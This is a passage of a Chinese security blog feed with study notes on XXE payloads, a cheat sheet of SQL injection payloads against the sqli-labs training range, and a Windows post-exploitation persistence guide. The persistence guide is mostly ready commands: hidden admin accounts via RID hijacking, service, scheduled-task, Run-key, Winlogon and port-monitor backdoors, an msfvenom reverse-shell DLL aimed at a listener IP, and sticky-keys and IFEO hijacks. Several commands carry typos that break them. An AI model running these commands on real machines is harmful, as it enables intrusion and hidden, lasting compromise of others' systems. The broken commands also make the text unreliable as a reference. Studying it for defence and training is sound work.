<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;</span><br></pre></td></tr></table></figure></div>

<p>不存在的端口就会产生报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140634383.png"
                      alt="image-20230416140634383"
                ></p>
<p>成功的话就会返回空白</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140703589.png"
                      alt="image-20230416140703589"
                ></p>
<h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><h6 id="白盒：代码审计"><a href="#白盒：代码审计" class="headerlink" title="白盒：代码审计"></a>白盒：代码审计</h6><h6 id="黑盒："><a href="#黑盒：" class="headerlink" title="黑盒："></a>黑盒：</h6><p>数据格式类型判断：  <user>test</user><pass>Mikasa</pass></p>
<p>Content-Type值的判断：1.text&#x2F;xml   2.application&#x2F;xml</p>
<p>更改Content-Type的值看返回</p>
<p>或者直接使用工具扫描</p>
<h5 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h5><p>参考链接：<a class="link"   href="https://xz.aliyun.com/t/3357" >https://xz.aliyun.com/t/3357 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>xxe的payload大全<a class="link"   href="https://github.com/payloadbox/xxe-injection-payload-list" >https://github.com/payloadbox/xxe-injection-payload-list <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2023/05/15/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="Sql注入一般步骤"><a href="#Sql注入一般步骤" class="headerlink" title="Sql注入一般步骤"></a>Sql注入一般步骤</h2><p>查看所有数据库</p>
<p>group_concat(schema_name)from information_schema.schemata</p>
<p>猜解表名</p>
<p>group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() </p>
<p>猜解列名</p>
<p>group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ </p>
<p>数据爆破</p>
<p>group_concat(username,0x3a,password) from users</p>
<h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>Union select 是联合查询的核心语句，类似U并运算</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询语句之间用；分开，在第二条构造要攻击的语句</p>
<p>Select verion；select database（）</p>
<p>可以任意使用增删改查，只返回第一条信息，第二条不返回</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>使用id&#x3D;1’and 1&#x3D;2–+  id&#x3D;1’and 1&#x3D;1–+ 判断是否有注入点，然后在使用堆叠语句	</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps1.jpg"
                      alt="img"
                > </p>
<p>获取到列，就可以执行增删改查</p>
<p>目前已经知道users：id username password</p>
<p>增：insert into users values(20,’123456’,’654321’)（添加账号）</p>
<p>查：insert into users values(20,（select authentication_string from mysql.user limit 1）,’654321’)为了解决第二条信息不返回的问题，只要利用子查询将查询到的值写入到新账号里，并用其id查询账号，就能显示了。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>特点：不对查询到的数据进行回显</p>
<p>原理：对表名或列名进行拆解，逐一的获取表名的字母顺序，最终拼接成完整表名，获取到数据。</p>
<p>SQL语句实例：</p>
<p><a class="link"   href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1" >http://127.0.0.1/sqli-labs-master/Less-5/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and substring((select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1),1,1)&#x3D;’e’ – -</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps2.jpg"
                      alt="img"
                > </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps3.jpg"
                      alt="img"
                > </p>
<p>不是该表&#x2F;列的字段，则不会回显You are in….</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps4.jpg"
                      alt="img"
                > </p>
<p>Substr（查询语句，1（2，3，4，5…），1）</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>与一次注入相比更难发现，且威胁相当</p>
<p>原理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps5.jpg"
                      alt="img"
                > </p>
<p>简单来说就是两次输入数据的拼凑形成攻击语句</p>
<p>靶场第24关</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>%df’ - &gt; 经过gpc会转义成 - &gt; （%df&#x2F;’）%df%5c%27(%df%5c&#x3D;运 汉字) - &gt; 这样&#x2F;就被过滤掉了就可以利用 ‘ 进行注入</p>
<p>一般有gpc或者addslashes都存在宽字节注入</p>
<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>与平时的注入差不多，以往是以get或者post的方式提交攻击语句，cookie注入则是以cookie进行提交数据。</p>
<p>一般用于get和post对数据进行过滤的情况下。</p>
<h3 id="Base64-编码注入"><a href="#Base64-编码注入" class="headerlink" title="Base64 编码注入"></a>Base64 编码注入</h3><p>靶场第21关</p>
<p>就是先转为base64编码致使‘ 保护被过滤掉，存进数据库的时候又解码为 ’ 使得攻击语句被注入</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>一般用到函数 sleep（）、if（）、</p>
<p>substring（）截取字符串</p>
<p>Select if（2&gt;1，sleep（5），0） </p>
<p>意思是如果给2&gt;1就可以延迟5秒反之则不变，显然2是大于1的所以会延迟5秒</p>
<p>我们就可以利用这一特性，结合盲注的原理在2&gt;1位置上加上sql语句，如判断是否为这个‘e’时就可以反应出来，这样就可以逐个击破。</p>
<p><a class="link"   href="http://127.0.0.1/sqli-labs-master/Less-9/?id=1" >http://127.0.0.1/sqli-labs-master/Less-9/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and if(((substr(concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1),1,1)&#x3D;’e’),sleep(5),1)–+</p>
<p>通过if语句进行正确性判断，利用盲注思想，对其进行逐一判断</p>
<p>实例：sqli靶场 第九关<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps6.jpg"
                      alt="img"
                ></p>
<h2 id="SQL注入备忘录"><a href="#SQL注入备忘录" class="headerlink" title="SQL注入备忘录"></a>SQL注入备忘录</h2><p> 一 . 联合注入</p>
<p>列出所有数据库 : </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来库名</span><br><span class="line">		select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">		select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>列出(数据库：test)中所有的表</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来字段名</span><br><span class="line">		select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br><span class="line">			注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</span><br></pre></td></tr></table></figure></div>



<p>列出（数据库：test 表：admin ）中所有的字段</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imit 一个一个打印出来</span><br><span class="line">		select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line">		</span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>列出（数据库：test 表：admin ）中所有的字段内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来</span><br><span class="line">		select username,passwd from test.admin limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 把 一次性全部打印</span><br><span class="line">		select group_concat(concat(username,0x20,passwd)) from test.admin</span><br></pre></td></tr></table></figure></div>



<h3 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h3><p>请注意,如果需要全部显示数据库需要用到substr函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(字符串,1,截取长度)</span><br><span class="line">select substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,7);</span><br></pre></td></tr></table></figure></div>



<h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></div>



<p>列出数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个列出 :</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure></div>



<p>查询表和字段直接把联合注入的payload放进去就可以了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and(select 1 from (select count(*),concat(concat((payload),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure></div>



<h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, (concat(0x7e,(payload),0x7e))</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure></div>



<h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1,(payload),1)</span><br><span class="line"></span><br><span class="line">and updatexml(1, (concat(0x7e,(select user()),0x7e)),1)</span><br></pre></td></tr></table></figure></div>



<h3 id="三-布尔注入"><a href="#三-布尔注入" class="headerlink" title="三 .布尔注入 :"></a>三 .布尔注入 :</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr((payload), 1, 1)))&gt;105 </span><br></pre></td></tr></table></figure></div>



<h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br></pre></td></tr></table></figure></div>



<h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节</span><br><span class="line"></span><br><span class="line">如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将</span><br><span class="line"></span><br><span class="line">Ascii大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>内网权限持久化</title>
    <url>/2023/05/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    <content><![CDATA[<p>当获得到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致的服务器权限的丢失，往往需要采取一些手段来实现对目标服务器的持久化访问</p>
<h2 id="常见的系统后门技术"><a href="#常见的系统后门技术" class="headerlink" title="常见的系统后门技术"></a>常见的系统后门技术</h2><h3 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h3><p>影子账户—隐藏的账户，无论怎样都看不到。只有在注册表中才能看到信息</p>
<h6 id="创建影子账户实践"><a href="#创建影子账户实践" class="headerlink" title="创建影子账户实践"></a>创建影子账户实践</h6><p>1.在目标主机中输入以下命令，创建一个名为Hacker$的账户</p>
<p><code>net user Hacker$ hacker@123 /add                #创建隐藏账户Hacker$</code></p>
<p>其中“$”符号表示隐藏用户的意思，利用命令行无法查看，但是在“控制面板”“计算机管理”等仍然能看到</p>
<p>且此时这个用户是标准用户，需要进入注册表修改使其成为管理员用户</p>
<p>2.在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM\右键单击，选择‘权限’命令，将Administrator用户的权限设置为完全控制</p>
<p>这是由于注册表项的内容在标准用户和管理员用户下都是不可见的</p>
<p>3.在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Accout\Users\Names，处选择Administrator用户在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名，即000001F4，复制000001F4中F文件的值</p>
<p>4.同理，找到隐藏账户的Hacker$相应的目录000003EA ，将他复制的000001F4中的F的值粘贴到他的F中，确认</p>
<p>原理是：隐藏用户劫持了管理员账户的的RID，从而使Hacker$具有管理员权限</p>
<p>5.分别选中Hacker$和00003EA并导出，然后运行<code>net user Hacker$ /del</code> 删除</p>
<p>之后再将导出的注册表到入回去即可</p>
<h3 id="系统服务后门"><a href="#系统服务后门" class="headerlink" title="系统服务后门"></a>系统服务后门</h3><p>主要原理就是测试人员将对于“自动”的系统服务，测试人员可以将这种服务的启动二进制文件路径改为攻击荷载或者后门程序，当系统和服务重启的时候就可以重新启动，但是得需要管理员权限</p>
<p>系统服务会自启，所以将路径攻击载荷的路径，服务启动时就会启动攻击载荷</p>
<h6 id="1-创建系统服务"><a href="#1-创建系统服务" class="headerlink" title="1.创建系统服务"></a>1.创建系统服务</h6><p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create Backdoor binpath= &quot;cmd.exe /K C:\Windows\System32\reverse_tcp.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span><br><span class="line">binpath后面必须有空格   obj指定运行权限   start指定启动类型</span><br></pre></td></tr></table></figure></div>

<p>reverse_tcp.exe这个利用msf生成并通过shell后门上传，一旦系统服务启动就会连带启动木马后门，实现权限维持</p>
<h6 id="2-利用现有服务"><a href="#2-利用现有服务" class="headerlink" title="2.利用现有服务"></a>2.利用现有服务</h6><p>利用现有服务路径修改即可，将路径映射至木马文件路径就可以实现木马持续被启动，达到权限维持的目的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用sc config修改binpath二进制选项</span><br><span class="line">也可以修改注册表ImagePath键</span><br></pre></td></tr></table></figure></div>

<h6 id="3-利用svchost-exe启动服务"><a href="#3-利用svchost-exe启动服务" class="headerlink" title="3.利用svchost.exe启动服务"></a>3.利用svchost.exe启动服务</h6><p>简要来说就是Windows中有些进程的启动得依托它才行</p>
<p>以DLL形式实现，所以可以将可执行文件路径指向svchost.exe，有它调用DLL文件，具体哪个就得是这个服务在注册表的信息决定的了</p>
<p>举个栗子</p>
<p>以wuauserv服务为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png"
                      alt="image-20230322093442598"
                ></p>
<p>这个服务的启动路径是由svchost.exe加载DLL实现的</p>
<p>这之中还有个parameters子项ServiceDLL是表明由哪个DLL文件负责的，就是说这个服务运行时会加载wuaueng.dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093846338.png"
                      alt="image-20230322093846338"
                ></p>
<p>注意每个svchost.exe负责一组进程的运行</p>
<p>svchost.exe的所有服务分组于注册表的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103733030.png"
                      alt="image-20230322103733030"
                ></p>
<p>中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103923408.png"
                      alt="image-20230322103923408"
                ></p>
<p>攻击的原理就是加载恶意服务到svchost.exe中建立持久化后门，又不是单独运行的，所以隐蔽性特别高</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击步骤</span><br><span class="line">1制作一个后门dll文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.81.135 lport=6000 -f dll -o gongji.dll   </span><br><span class="line"></span><br><span class="line">2.上传至目标主机System32目录执行以下命令</span><br><span class="line">先创建一个名为backdoor的服务，然后以svchost加载方式启动，服务分组为netsvc</span><br><span class="line">sc create backdoor binPath= &quot;C:\Windows\Ststem32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem</span><br><span class="line">然后再将这个服务启动时的加载路径设为后门木马的路径</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;</span><br><span class="line">配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v Destription /t REG_sz /d &quot;Windows xxx Service&quot;</span><br><span class="line">配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v DisplayName /t REG_sz /d &quot;Backdoor&quot;</span><br><span class="line">创建服务新分组netsvc，并将backdoor服务添加进去</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrrntVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d backdoor</span><br></pre></td></tr></table></figure></div>

<p>然后只要系统重启就可以导致木马被重新启动</p>
<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><p>就是让目标主机再指定的周期内自动重复的运行事先准备好的后门</p>
<p>使用schtasks命令来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</span><br><span class="line">表示在主机上创建一个名为Backdoor的任务，并在每天的8点以SYSTEM权限运行</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322170426739.png"
                      alt="image-20230322170426739"
                ></p>
<p>以下命令是创建一个名为Backdoor的计划任务，每60秒运行一次</p>
<p><code>schtasks /Create /TN  Backdoor /SC minute /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</code></p>
<p>有一点要说明计划任务是在计划任务库中的类似文件目录的形式存储，所有的计划任务都在最内层，为了增加隐蔽性，所以要遵守规范</p>
<p>执行以下命令，表示在路径下创建一个AppRun的后门</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172521990.png"
                      alt="image-20230322172521990"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172505028.png"
                      alt="image-20230322172505028" style="zoom: 33%;" 
                >



<h3 id="启动项-x2F-注册表键后门"><a href="#启动项-x2F-注册表键后门" class="headerlink" title="启动项&#x2F;注册表键后门"></a>启动项&#x2F;注册表键后门</h3><h6 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a>1.系统启动文件夹</h6><p>将程序放在启动文件夹中会导致该程序在用户登入时启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登入时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start</span><br><span class="line">C:\C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">所有用户登入时启动</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></div>

<p>木马放进去就行</p>
<h6 id="2-运行键（Run-Key）"><a href="#2-运行键（Run-Key）" class="headerlink" title="2.运行键（Run Key）"></a>2.运行键（Run Key）</h6><p>windows中有许多注册表项可以用来设置在系统启动或者用户登陆时运行指定的程序或加载指定DLL文件</p>
<p>当登陆时，系统就会依次运行位于注册表运行键中的程序</p>
<p>默认创建以下运行键，如果要修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将在当前用户登陆时启动</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">将在所有用户登陆时启动</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure></div>

<p>执行的命令，表示在注册表运行键中添加一个叫backdoor的键，并且指向后门文件的绝对路径</p>
<p><code>reg add &quot;HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v backdoor /t REG_SZ /D &quot;C:\Windows\System32\reverse_TCP.exe&quot;</code></p>
<h6 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h6><p>这个是一个Windows系统组件，处理一系列与用户有关的行为，这些行为在注册表中，并且定义了在Windows登录期间会启动那些进程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登录时执行的和用户初始化程序，默认是userinit.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">指定windows身份验证期间执行的程序，默认为explorer.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure></div>

<p>执行命令</p>
<p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\reverse_tcp.exe&quot; /f</code></p>
<p>注意：在利用这两个键时需要保留原有的程序，可以将后门添加到原有程序后面以“，”分隔就行，并且需要上传到C:\Windows\System32文件夹中</p>
<h3 id="Port-Monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h3><p>打印机后台处理服务负责管理Windows系统的打印作业</p>
<p>主要是依靠他之中的AddMonitor函数将DLL注入spoolsv.exe进程</p>
<p>1.通过msf生成一个64位的DLL恶意木马</p>
<p>2.将这个文件上传到目标主机的C:\Windows\System32目录中</p>
<p>执行<code>reg add &quot;HKLM\SYSTEM CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ /d &quot;reverse_tcp.dll&quot;</code></p>
<p>当系统启动的时候，print spooler服务在启动过程会读取Monitors注册表项的所有子键，并且以SYSTEM权限加载Driver键值所指定的DLL文件</p>
<h2 id="事件触发执行"><a href="#事件触发执行" class="headerlink" title="事件触发执行"></a>事件触发执行</h2><h4 id="利用WMI订阅事件"><a href="#利用WMI订阅事件" class="headerlink" title="利用WMI订阅事件"></a>利用WMI订阅事件</h4><h6 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><h6 id="2-相关辅助工具"><a href="#2-相关辅助工具" class="headerlink" title="2.相关辅助工具"></a>2.相关辅助工具</h6><p>利用Sharp-WMIEvent工具，可以实现持久化功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这表示在主机上部署一个永久性的订阅事件，每当用户登录时就会调用，远程主机就会上线</p>
<p>此外msf还包含一个内置框架也可以通过WMI实现持久性的模块，exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持的选项不同，可以用于在特定的事件触发时在系统上执行任意攻击载荷</p>
<h4 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h4><p>一般Windows系统会有许多组合快捷键来达到某种功能如Windows+“+”、Windows+U等</p>
<p>最常用的时连按五次shift打开粘滞键sethc.exe程序</p>
<p>通常将cmd.exe伪装成sethc.exe，此方法需要管理员权限</p>
<h6 id="1-手动利用-1"><a href="#1-手动利用-1" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><p>在高版本Windows中，C:\Windows\System32目录下的文件收到系统的保护，只有TrustedInstaller权限用户才对其中的问价拥有修改和写入权限，所以在这之前需要通过令牌窃取提升至TrustedInstaller权限。</p>
<p>获取后执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak      将文件sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe            将一个cmd.exe副本伪装成sethc.exe</span><br></pre></td></tr></table></figure></div>

<p>这时候连按五次shift键就可以开启cmd.exe，权限为SYSTEM</p>
<h6 id="2-RDP劫持"><a href="#2-RDP劫持" class="headerlink" title="2.RDP劫持"></a>2.RDP劫持</h6><h4 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h4><p>IFEO是Windows系统的一个注册表项，位于HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options中，负责为一些在默认系统环境中运行时可能引发错误的程序执行提供一个特殊的环境设定</p>
<h6 id="1-Dubugger"><a href="#1-Dubugger" class="headerlink" title="1.Dubugger"></a>1.Dubugger</h6><p>当用户启动计算机后，系统就会在注册表中的IEFO中查询所有的程序的子键，如果存在与该程序名相同的子键就会读取相应的Dubugger键值，如果键值没被设置就不做处理，否则则将键值所对应的路径作为程序的启动路径来代替原始程序</p>
<p>可以联想到上面的粘滞键，测试人员就可以修改粘滞键注册表信息来创建后门，就不需要TrustedInstaller权限</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>向Image File Execution Options注册表项中添加映像劫持子键，并将“Dubugger”的值设置为要执行的程序即可</p>
<p>然后连按5次就可以成功弹出命令</p>
